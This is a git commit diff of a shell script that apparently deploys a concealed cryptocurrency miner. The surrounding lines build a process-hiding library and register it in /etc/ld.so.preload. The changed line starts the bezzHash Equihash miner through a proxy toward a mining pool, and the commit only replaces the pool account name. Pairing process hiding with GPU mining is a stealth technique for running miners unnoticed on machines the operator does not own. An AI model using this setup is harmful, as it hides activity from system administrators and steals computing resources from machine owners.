f29e086ab84d002ae3e9be4f2b24b9e85f31cf1b
saundersis <96547591+saundersis@users.noreply.github.com>
2022-02-26 23:11:46 +0530

    Update start_bezzHash_btg_ws1.sh

--- start_bezzHash_btg_ws1.sh
+++ start_bezzHash_btg_ws1.sh
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --user mikrotik999.TeslaT4 --server us-east.equihash-hub.miningpoolhub.com --port 20595 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes
+./graftcp/graftcp ./bezzHash --user Skyforce123.TeslaT4 --server us-east.equihash-hub.miningpoolhub.com --port 20595 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes
